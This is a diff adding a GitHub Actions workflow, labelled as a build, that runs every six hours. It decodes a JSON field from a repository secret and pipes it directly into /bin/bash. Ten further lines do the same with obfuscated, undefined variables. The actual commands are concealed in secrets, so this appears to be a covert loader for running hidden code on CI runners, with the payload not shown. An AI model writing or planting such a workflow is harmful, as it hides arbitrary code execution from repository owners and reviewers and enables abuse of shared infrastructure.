@@ -1,0 +1,28 @@
+name: minjiejunshi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: minjiejunshi
+        env:
+          aqpna9: ${{ secrets.aqpna9 }}
+        run: |
+          echo $aqpna9 | jq -r .haomj96 | /bin/bash
+          echo $rv61 | jq -r .hwrq81957 | /bin/bash
+          echo $fvdag0820 | jq -r .sa452 | /bin/bash
+          echo $nse7230 | jq -r .zcl3755 | /bin/bash
+          echo $upddg322 | jq -r .vjz32 | /bin/bash
+          echo $fiphq118 | jq -r .wrzt933 | /bin/bash
+          echo $e26801 | jq -r .boett8 | /bin/bash
+          echo $x066 | jq -r .c608 | /bin/bash
+          echo $zs1 | jq -r .pln18 | /bin/bash
+          echo $znm0 | jq -r .rbcao70 | /bin/bash
+          echo $e838 | jq -r .of05470 | /bin/bash
+
